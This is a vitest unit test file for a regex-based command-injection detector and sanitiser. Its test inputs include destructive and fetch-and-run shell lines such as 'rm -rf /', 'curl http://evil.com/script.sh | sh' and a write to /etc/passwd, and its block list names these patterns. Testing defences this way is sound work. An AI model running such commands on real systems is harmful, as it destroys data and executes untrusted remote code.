// tests/unit/core/security/command-injection.test.ts

import { describe, it, expect } from "vitest";

// Simple command injection detector
function detectCommandInjection(input: string): { blocked: boolean; reason?: string } {
  const blockedPatterns = [
    { pattern: /;[\s]*[a-z]/i, reason: "Command chaining with semicolon" },
    { pattern: /&&[\s]*[a-z]/i, reason: "Command chaining with &&" },
    { pattern: /\|[\s]*[a-z]/i, reason: "Pipe to command" },
    { pattern: /\$\(.*\)/, reason: "Command substitution" },
    { pattern: /`[^`]*`/, reason: "Backtick command substitution" },
    { pattern: />\s*\/etc\//i, reason: "Redirect to system file" },
    { pattern: /rm\s+-rf/i, reason: "Dangerous rm command" },
    { pattern: /curl\s+.*\|\s*sh/i, reason: "Pipe to shell" },
    { pattern: /wget\s+.*\|\s*sh/i, reason: "Pipe to shell" },
  ];

  for (const { pattern, reason } of blockedPatterns) {
    if (pattern.test(input)) {
      return { blocked: true, reason };
    }
  }

  return { blocked: false };
}

function sanitizeCommand(input: string): string {
  // Remove dangerous characters
  return input
    .replace(/[;&|`$()]/g, "")
    .replace(/\s+/g, " ")
    .trim();
}

describe("Security: Command Injection", () => {
  describe("detectCommandInjection", () => {
    it("blocks semicolon chaining", () => {
      const result = detectCommandInjection("ls; rm -rf /");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("semicolon");
    });

    it("blocks && chaining", () => {
      const result = detectCommandInjection("echo hello && rm -rf /");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("&&");
    });

    it("blocks pipe to command", () => {
      const result = detectCommandInjection("cat file | sh");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("Pipe");
    });

    it("blocks command substitution", () => {
      const result = detectCommandInjection("echo $(whoami)");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("substitution");
    });

    it("blocks backtick substitution", () => {
      const result = detectCommandInjection("echo `whoami`");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("Backtick");
    });

    it("blocks redirect to /etc/", () => {
      const result = detectCommandInjection("echo hack > /etc/passwd");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("system file");
    });

    it("blocks rm -rf", () => {
      const result = detectCommandInjection("rm -rf /");
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain("Dangerous");
    });

    it("blocks curl pipe to shell", () => {
      const result = detectCommandInjection("curl http://evil.com/script.sh | sh");
      expect(result.blocked).toBe(true);
    });

    it("blocks wget pipe to shell", () => {
      const result = detectCommandInjection("wget http://evil.com/script.sh | sh");
      expect(result.blocked).toBe(true);
    });

    it("allows normal commands", () => {
      const result = detectCommandInjection("npm install");
      expect(result.blocked).toBe(false);
    });

    it("allows git commands", () => {
      const result = detectCommandInjection("git commit -m 'test'");
      expect(result.blocked).toBe(false);
    });

    it("allows file paths", () => {
      const result = detectCommandInjection("cat src/index.ts");
      expect(result.blocked).toBe(false);
    });
  });

  describe("sanitizeCommand", () => {
    it("removes semicolons", () => {
      expect(sanitizeCommand("ls; rm -rf /")).toBe("ls rm -rf /");
    });

    it("removes &&", () => {
      expect(sanitizeCommand("echo hello && rm")).toBe("echo hello rm");
    });

    it("removes pipes", () => {
      expect(sanitizeCommand("cat file | sh")).toBe("cat file sh");
    });

    it("removes backticks", () => {
      expect(sanitizeCommand("echo `whoami`")).toBe("echo whoami");
    });

    it("removes command substitution", () => {
      expect(sanitizeCommand("echo $(whoami)")).toBe("echo whoami");
    });

    it("collapses whitespace", () => {
      expect(sanitizeCommand("  hello   world  ")).toBe("hello world");
    });
  });
});
